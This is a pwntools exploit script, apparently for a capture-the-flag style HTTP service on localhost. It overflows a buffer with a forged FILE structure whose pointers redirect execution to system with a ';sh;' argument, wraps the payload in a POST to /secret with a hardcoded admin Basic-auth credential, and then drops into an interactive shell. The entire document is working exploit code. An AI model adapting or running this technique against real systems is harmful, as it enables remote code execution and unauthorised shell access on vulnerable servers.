from pwn import *

r = remote("127.0.0.1", 9999)

#heap = 0xff5c8178 - 0x2178
heap = 0xff5d2178 - 0x2178
f  = p32(0xfbad2e84)
f += p32(heap + 0x101)*7
f += p32(heap + 0x401)
f += b";sh;"
f += p32(0)*3
f += p32(heap +0x2008)
f += p32(1)
f += p32(0)*3
f += p32(heap + 0x2218)
f += p32(0)
f += p32(0xffffffff)*2
f += p32(0)
f += p32(heap + 0x2224)
f += p32(0)*3
f += p32(0xffffffff)
f += p32(0)*10
f += p32(heap + 0x2638)

p  = b"a"*0x108
p += p32(heap + 0x2598) # fake file ptr
p += p32(0)
p += f
p += p32(heap + 0x132121)*20 # system
p  = p.ljust(0x200, b'c')

data  = b"POST /secret HTTP/1.1\r\n"
data += b"Host: aaaaaaaaaaaaaaa\r\n"
data += b"Authorization: Basic YWRtaW46UzNjcjM3XyFAIwAAAAAAAAAAAAAAAAA\r\n"
data += b"Content-Length: %d\r\n" % len(p)
data += b"Cookie: username=admin;\r\n"
data += b"\r\n"
data += p

print(data)
r.sendline(data)

r.interactive()
